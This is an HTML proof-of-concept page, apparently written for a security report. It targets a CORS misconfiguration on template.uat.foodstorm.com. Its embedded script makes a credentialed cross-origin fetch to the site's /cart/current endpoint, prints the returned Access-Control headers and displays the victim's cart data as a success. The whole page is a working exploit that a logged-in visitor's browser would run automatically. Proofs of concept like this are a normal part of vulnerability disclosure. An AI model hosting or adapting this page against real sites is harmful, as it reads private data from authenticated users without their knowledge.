<!DOCTYPE html>
<html>
<head>
  <title>CORS CSRF PoC - template.uat.foodstorm.com/cart/add</title>
</head>
<body>
  <h2>CORS Misconfiguration PoC</h2>
  <p>Sending cross-origin request with victim credentials...</p>
  <pre id="output">Waiting for response...</pre>

  <script>
    fetch("https://template.uat.foodstorm.com/cart/current", {
      method: "GET",
      credentials: "include",
    })
    .then(r => {
      document.getElementById("output").innerText +=
        "\n\nAccess-Control-Allow-Origin: " + r.headers.get("access-control-allow-origin") +
        "\nAccess-Control-Allow-Credentials: " + r.headers.get("access-control-allow-credentials");
      return r.json();
    })
    .then(data => {
      document.getElementById("output").innerText =
        "SUCCESS - Victim cart data read cross-origin:\n\n" +
        JSON.stringify(data, null, 2);
    })
    .catch(err => {
      document.getElementById("output").innerText = "Error: " + err;
    });
  </script>
</body>
</html>
